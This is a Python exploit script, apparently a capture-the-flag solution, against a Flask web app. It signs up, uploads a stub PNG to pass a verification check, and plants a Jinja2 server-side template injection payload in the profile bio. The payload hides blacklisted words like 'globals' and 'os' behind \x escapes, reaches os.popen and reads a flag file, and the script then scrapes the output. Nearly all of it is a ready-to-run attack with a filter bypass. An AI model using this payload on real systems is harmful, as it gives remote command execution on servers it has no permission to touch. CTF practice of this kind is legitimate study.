#!/usr/bin/env python3
import re
import secrets
import sys
import requests

# Jinja2 payload that calls os.popen through Flask's url_for globals.
# The blacklist in checkInput() blocks "__", "attr", "globals", "os", "[" and
# others, so each blocked word is written as a string with \x escapes. Jinja
# expands those escapes at render time, so the blacklist never sees the words.
#   url_for.__globals__ -> dict, .get("os") -> os module,
#   map(attr "popen") -> os.popen, then call it.
SSTI = (
    '{{ ((((lipsum,)|map("\\x61ttr","\\x5f\\x5f\\x67lobals\\x5f\\x5f")|first)'
    '.get("\\x6fs"),)|map("\\x61ttr","\\x70open")|first)'
    '("cat /app/flag.txt").read() }}'
)


def exploit(target_ip, target_port):
    base_url = f"http://{target_ip}:{target_port}"
    session = requests.Session()

    username = "u" + secrets.token_hex(4)
    password = secrets.token_hex(8)
    email = f"{username}@example.com"

    print(f"[*] Creating account {username}...")
    session.post(
        f"{base_url}/signup",
        data={"email": email, "username": username, "password": password},
        timeout=5,
    )
    session.post(
        f"{base_url}/login",
        data={"username": username, "password": password},
        timeout=5,
    )

    # A verification record must exist before /profile accepts a bio.
    # The upload is not checked for content, so any image bytes work.
    print("[*] Submitting a verification document...")
    session.post(
        f"{base_url}/verification",
        files={"file": ("badge.png", b"\x89PNG\r\n\x1a\n", "image/png")},
        timeout=5,
    )

    print("[*] Setting the bio to the template payload...")
    session.post(f"{base_url}/profile", data={"bio": SSTI}, timeout=5)

    # /getlink stores a share link whose key is the username.
    print("[*] Creating the share link...")
    session.get(f"{base_url}/getlink", timeout=5)

    print(f"[*] Rendering /user/{username}...")
    response = requests.get(f"{base_url}/user/{username}", timeout=5)
    match = re.search(r'class="para-class">(.*?)</p>', response.text, re.S)
    if match:
        print(f"\n[+] Flag:\n{match.group(1).strip()}")
    else:
        print(f"[-] Unexpected response ({response.status_code}):")
        print(response.text[:500])


if __name__ == "__main__":
    if len(sys.argv) != 3:
        print(f"Usage: python3 {sys.argv[0]} <target_ip> <target_port>")
        sys.exit(1)

    exploit(sys.argv[1], int(sys.argv[2]))
